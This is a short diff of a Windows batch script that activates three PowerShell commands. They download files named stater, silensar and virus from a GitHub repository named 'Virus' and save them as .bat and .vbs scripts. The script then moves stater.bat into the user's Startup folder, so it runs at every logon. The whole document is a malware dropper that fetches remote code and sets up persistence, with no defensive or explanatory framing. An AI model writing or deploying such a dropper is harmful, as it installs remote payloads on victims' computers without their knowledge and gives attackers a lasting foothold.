@@ -1,9 +1,9 @@
 @echo off
 cls
 :: First download a file.
-::Powershell -Command "Invoke-WebRequest 'https://github.com/MrAax/stater.txt' -OutFile stater.bat"
-::Powershell -Command "& { iwr https://github.com/MrAax/silensar.txt -OutFile silensar.vbs}"
-::Powershell -Command "Invoke-WebRequest 'https://github.com/MrAax/virus.txt' -OutFile virus.bat"
+Powershell -Command "Invoke-WebRequest 'https://github.com/MrAax/Virus/blob/main/Windows/stater.txt' -OutFile stater.bat"
+Powershell -Command "& { iwr https://github.com/MrAax/Virus/blob/main/Windows/silensar.txt -OutFile silensar.vbs}"
+Powershell -Command "Invoke-WebRequest 'https://github.com/MrAax/Virus/blob/main/Windows/virus.txt' -OutFile virus.bat"
 
 :: Copy all files in destination.
 move /y "stater.bat" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\stater.bat"
